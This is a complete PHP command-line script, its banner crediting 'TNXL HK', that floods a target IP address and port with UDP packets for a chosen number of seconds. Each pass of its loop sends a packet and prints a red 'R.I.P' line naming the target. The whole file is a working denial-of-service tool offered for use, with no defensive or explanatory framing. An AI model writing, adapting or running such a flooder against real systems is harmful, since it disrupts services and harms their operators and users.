<?php
set_time_limit(0);

if($argc < 4)
{
	print("[+]UDP PHP BY TNXL HK\n");
	exit("Usage: $argv[0] <IP> <PORT> <TIME>\n");
	
}

else
{
 
udp($argv[1], $argv[2], $argv[3]); 

}




function udp($host, $port, $time) { 
                
        $timei    = time();
	$packetsize = 1;
        $packet = "";
        for ($i = 0; $i < $packetsize; $i++) {
            $packet .= chr(rand(1, 256));
        }
		$i = 0;
		
        while (time() - $timei < $time) {
            
            $handle = fsockopen("udp://".$host,$port,$e,$s,5);
            fwrite($handle, $packet);
	    fflush($handle);
            echo "\033[01;31m[+] R.I.P $host \033[0m\n";
        }
        
    }




?>